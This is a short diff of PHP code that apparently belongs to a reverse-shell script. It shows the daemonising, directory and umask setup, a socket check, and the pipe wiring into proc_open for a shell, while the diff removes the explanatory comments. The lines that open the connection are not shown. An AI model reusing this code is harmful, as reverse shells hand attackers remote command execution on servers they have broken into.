@@ -36,10 +36,10 @@ if (function_exists('pcntl_fork')) {
 	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
 }
 
-// Change to a safe directory
+
 chdir("/");
 
-// Remove any umask we inherited
+
 umask(0);
 
 
@@ -54,9 +54,9 @@ if (!$sock) {
 
 
 $descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+   0 => array("pipe", "r"),  
+   1 => array("pipe", "w"),  
+   2 => array("pipe", "w")  
 );
 
 $process = proc_open($shell, $descriptorspec, $pipes);
